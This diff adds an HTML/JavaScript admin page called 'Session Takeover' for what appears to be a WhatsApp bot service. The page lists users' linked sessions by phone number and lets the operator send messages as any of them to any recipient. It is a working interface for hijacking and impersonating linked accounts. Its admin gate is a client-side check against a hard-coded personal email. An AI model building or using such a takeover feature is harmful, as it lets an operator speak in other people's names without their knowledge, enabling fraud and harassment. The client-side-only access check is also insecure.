@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>Session Takeover | 303-XMD</title>
+<meta name="theme-color" content="#ff6b9d">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🎭</text></svg>">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+<link rel="stylesheet" href="/theme.css">
+<style>
+body.theme-takeover{
+    --g1:#ff6b9d;
+    --g2:#c44569;
+    --glow:rgba(255,107,157,.4);
+    --bg:#1a0011;
+    --bg2:#2e0018;
+}
+
+.takeover-grid{
+    display:grid;
+    grid-template-columns:1fr;
+    gap:16px;
+}
+@media(min-width:900px){
+    .takeover-grid{ grid-template-columns:280px 1fr; }
+}
+
+.session-list{
+    background:var(--panel);
+    border:1px solid var(--border);
+    border-radius:14px;
+    padding:12px;
+    height:fit-content;
+    max-height:600px;
+    overflow-y:auto;
+}
+.session-list h4{
+    font-size:11px;
+    letter-spacing:2px;
+    text-transform:uppercase;
+    color:var(--muted);
+    margin-bottom:10px;
+    padding:4px 8px;
+}
+.sess-btn{
+    width:100%;
+    text-align:left;
+    padding:10px 12px;
+    background:rgba(255,255,255,.03);
+    border:1px solid var(--border);
+    border-radius:10px;
+    margin-bottom:6px;
+    cursor:pointer;
+    transition:.2s;
+    color:var(--text);
+    font-family:inherit;
+    font-size:12.5px;
+}
+.sess-btn:hover{ background:rgba(255,107,157,.08); border-color:var(--g1); }
+.sess-btn.active{
+    background:linear-gradient(135deg,var(--g1),var(--g2));
+    color:#000;
+    border-color:transparent;
+    font-weight:700;
+}
+.sess-btn .phone{ font-weight:700; }
+.sess-btn .status{
+    display:block;
+    font-size:10px;
+    letter-spacing:1px;
+    text-transform:uppercase;
+    opacity:.7;
+    margin-top:3px;
+}
+.sess-btn.active .status{ opacity:.85; }
+
+.compose-box{
+    background:var(--panel);
+    border:1px solid var(--border);
+    border-radius:14px;
+    padding:20px;
+}
+.compose-box h3{
+    font-size:14px;
+    letter-spacing:2px;
+    text-transform:uppercase;
+    color:var(--g1);
+    margin-bottom:6px;
+}
+.compose-box p{
+    font-size:12px;
+    color:var(--muted);
+    margin-bottom:16px;
+}
+.compose-box label{
+    display:block;
+    font-size:11px;
+    letter-spacing:2px;
+    text-transform:uppercase;
+    color:var(--muted);
+    margin-bottom:6px;
+    margin-top:12px;
+}
+.compose-box input,
+.compose-box textarea{
+    width:100%;
+    padding:12px 14px;
+    background:rgba(0,0,0,.4);
+    border:1px solid var(--border);
+    color:var(--text);
+    border-radius:10px;
+    font-size:14px;
+    font-family:inherit;
+    outline:none;
+}
+.compose-box textarea{ min-height:100px; resize:vertical; line-height:1.5; }
+.compose-box input:focus,
+.compose-box textarea:focus{
+    border-color:var(--g1);
+    box-shadow:0 0 20px var(--glow);
+}
+.compose-box input.mono{ font-family:'Courier New',monospace; font-size:13px; }
+
+.send-btns{
+    display:grid;
+    grid-template-columns:1fr 1fr;
+    gap:8px;
+    margin-top:16px;
+}
+
+.result-box{
+    margin-top:16px;
+    padding:14px;
+    background:rgba(0,0,0,.35);
+    border-left:3px solid var(--g1);
+    border-radius:10px;
+    font-size:13px;
+    color:var(--text);
+    line-height:1.6;
+    display:none;
+}
+.result-box.show{ display:block; }
+.result-box.error{
+    border-left-color:#ff5252;
+    color:#ff9999;
+    background:rgba(255,82,82,.08);
+}
+
+.log-box{
+    background:var(--panel);
+    border:1px solid var(--border);
+    border-radius:14px;
+    padding:16px;
+    margin-top:16px;
+    max-height:300px;
+    overflow-y:auto;
+}
+.log-box h4{
+    font-size:11px;
+    letter-spacing:2px;
+    text-transform:uppercase;
+    color:var(--muted);
+    margin-bottom:10px;
+}
+.log-item{
+    font-size:11.5px;
+    padding:8px 10px;
+    background:rgba(255,255,255,.03);
+    border-radius:8px;
+    margin-bottom:6px;
+    border-left:2px solid var(--g1);
+    font-family:'Courier New',monospace;
+    word-break:break-all;
+}
+.log-item .time{ color:var(--muted); font-size:10px; }
+</style>
+</head>
+<body class="theme-takeover">
+
+<div id="appSidebarMount"></div>
+
+<main class="app-content">
+    <div class="page-head">
+        <div>
+            <h2>Session Takeover</h2>
+            <div class="sub">Send messages as any linked session</div>
+        </div>
+        <button class="btn btn-ghost btn-sm" id="refreshBtn"><i class="fas fa-rotate"></i> Refresh</button>
+    </div>
+
+    <div class="takeover-grid">
+        <!-- Session picker -->
+        <aside class="session-list">
+            <h4><i class="fas fa-mobile-screen"></i> Pick session</h4>
+            <div id="sessionsRoot">
+                <div style="font-size:12px;color:var(--muted);padding:10px;text-align:center">Loading…</div>
+            </div>
+        </aside>
+
+        <!-- Compose -->
+        <div>
+            <div class="compose-box">
+                <h3 id="composeTitle">Compose message</h3>
+                <p id="composeSub">Choose a session on the left, then type a message</p>
+
+                <label>Recipient (phone or JID)</label>
+                <input type="text" id="toInput" class="mono" placeholder="254712345678 or 1234567@g.us">
+
+                <label>Message</label>
+                <textarea id="textInput" placeholder="Type your message…"></textarea>
+
+                <div class="send-btns">
+                    <button class="btn btn-primary" id="sendBtn" disabled>
+                        <i class="fas fa-paper-plane"></i> Send
+                    </button>
+                    <button class="btn btn-ghost" id="clearBtn">
+                        <i class="fas fa-eraser"></i> Clear
+                    </button>
+                </div>
+
+                <div class="result-box" id="result"></div>
+            </div>
+
+            <div class="log-box">
+                <h4><i class="fas fa-clock-rotate-left"></i> Recent sends (this session)</h4>
+                <div id="logRoot">
+                    <div style="font-size:12px;color:var(--muted);text-align:center;padding:10px">No sends yet</div>
+                </div>
+            </div>
+        </div>
+    </div>
+</main>
+
+<div class="toast" id="toast"></div>
+
+<script src="/sidebar.js"></script>
+<script>
+const ADMIN_EMAIL = 'ryanobanga243@gmail.com';
+const token = localStorage.getItem('token');
+const user = JSON.parse(localStorage.getItem('user') || '{}');
+if (!token) location.href = '/login';
+
+const email = (user.email || '').trim().toLowerCase();
+if (email !== ADMIN_EMAIL.toLowerCase()) {
+    document.body.innerHTML = `<div style="min-height:100vh;display:flex;align-items:center;justify-content:center;color:#fff;font-family:sans-serif;text-align:center"><div><h2>ACCESS DENIED</h2><p style="color:#888">Admin only</p></div></div>`;
+    throw new Error('Not admin');
+}
+
+const sessionsRoot = document.getElementById('sessionsRoot');
+const toInput = document.getElementById('toInput');
+const textInput = document.getElementById('textInput');
+const sendBtn = document.getElementById('sendBtn');
+const clearBtn = document.getElementById('clearBtn');
+const resultEl = document.getElementById('result');
+const logRoot = document.getElementById('logRoot');
+const composeTitle = document.getElementById('composeTitle');
+const composeSub = document.getElementById('composeSub');
+const toastEl = document.getElementById('toast');
+
+let allSessions = [];
+let selectedSession = null;
+const sendLog = [];
+
+function toast(msg, err = false) {
+    toastEl.textContent = msg;
+    toastEl.classList.toggle('err', err);
+    toastEl.classList.add('show');
+    setTimeout(() => toastEl.classList.remove('show'), 2200);
+}
+function escapeHtml(s) {
+    return String(s || '').replace(/[&<>"']/g, c => ({
+        '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
+    }[c]));
+}
+
+async function loadSessions() {
+    try {
+        const r = await fetch('/api/admin/takeover/sessions', {
+            headers: { 'Authorization': 'Bearer ' + token }
+        });
+        const d = await r.json();
+        if (!r.ok) throw new Error(d.error || 'Failed');
+        allSessions = d.sessions || [];
+        renderSessions();
+    } catch (e) {
+        sessionsRoot.innerHTML = `<div style="font-size:12px;color:#ff9999;padding:10px;text-align:center">❌ ${escapeHtml(e.message)}</div>`;
+    }
+}
+
+function renderSessions() {
+    if (!allSessions.length) {
+        sessionsRoot.innerHTML = `<div style="font-size:12px;color:var(--muted);padding:10px;text-align:center">No active sessions</div>`;
+        return;
+    }
+
+    sessionsRoot.innerHTML = allSessions.map(s => `
+        <button class="sess-btn${selectedSession?.sessionId === s.sessionId ? ' active' : ''}" data-id="${escapeHtml(s.sessionId)}">
+            <div class="phone">📱 +${escapeHtml(s.phone || 'pending')}</div>
+            <div class="status">${s.connected ? '🟢 online' : '🔴 offline'}</div>
+        </button>
+    `).join('');
+
+    sessionsRoot.querySelectorAll('.sess-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+            const id = btn.dataset.id;
+            selectedSession = allSessions.find(s => s.sessionId === id);
+            renderSessions();
+            onSessionPicked();
+        });
+    });
+}
+
+function onSessionPicked() {
+    if (!selectedSession) return;
+    composeTitle.textContent = `Send as +${selectedSession.phone}`;
+    composeSub.textContent = `Session ${selectedSession.sessionId.slice(0, 20)}…`;
+
+    if (selectedSession.connected) {
+        sendBtn.disabled = false;
+    } else {
+        sendBtn.disabled = true;
+        showResult('❌ Session is offline — resume it from Sessions Control first', true);
+    }
+}
+
+function showResult(text, isErr = false) {
+    resultEl.textContent = text;
+    resultEl.classList.toggle('error', isErr);
+    resultEl.classList.add('show');
+}
+
+sendBtn.onclick = async () => {
+    if (!selectedSession) return toast('Pick a session first', true);
+    const to = toInput.value.trim();
+    const text = textInput.value.trim();
+
+    if (!to) return toast('Enter a recipient', true);
+    if (!text) return toast('Enter a message', true);
+
+    sendBtn.disabled = true;
+    sendBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending…';
+    resultEl.classList.remove('show');
+
+    try {
+        const r = await fetch('/api/admin/takeover/send', {
+            method: 'POST',
+            headers: {
+                'Authorization': 'Bearer ' + token,
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                sessionId: selectedSession.sessionId,
+                to,
+                text
+            })
+        });
+        const d = await r.json();
+        if (!r.ok) throw new Error(d.error || 'Failed');
+
+        showResult(`✅ Sent!\nTo: ${to}\nMessage ID: ${d.messageId || 'n/a'}`);
+        toast('Sent!');
+
+        sendLog.unshift({
+            time: new Date().toLocaleTimeString(),
+            to,
+            text: text.slice(0, 60) + (text.length > 60 ? '…' : '')
+        });
+        renderLog();
+        textInput.value = '';
+    } catch (e) {
+        showResult('❌ ' + e.message, true);
+        toast(e.message, true);
+    }
+
+    sendBtn.disabled = false;
+    sendBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Send';
+};
+
+clearBtn.onclick = () => {
+    toInput.value = '';
+    textInput.value = '';
+    resultEl.classList.remove('show');
+};
+
+function renderLog() {
+    if (!sendLog.length) {
+        logRoot.innerHTML = `<div style="font-size:12px;color:var(--muted);text-align:center;padding:10px">No sends yet</div>`;
+        return;
+    }
+    logRoot.innerHTML = sendLog.slice(0, 20).map(l => `
+        <div class="log-item">
+            <span class="time">${escapeHtml(l.time)}</span> → <b>${escapeHtml(l.to)}</b><br>
+            ${escapeHtml(l.text)}
+        </div>
+    `).join('');
+}
+
+document.getElementById('refreshBtn').onclick = () => { loadSessions(); toast('Refreshed'); };
+
+loadSessions();
+setInterval(loadSessions, 10000);
+</script>
+</body>
+</html>
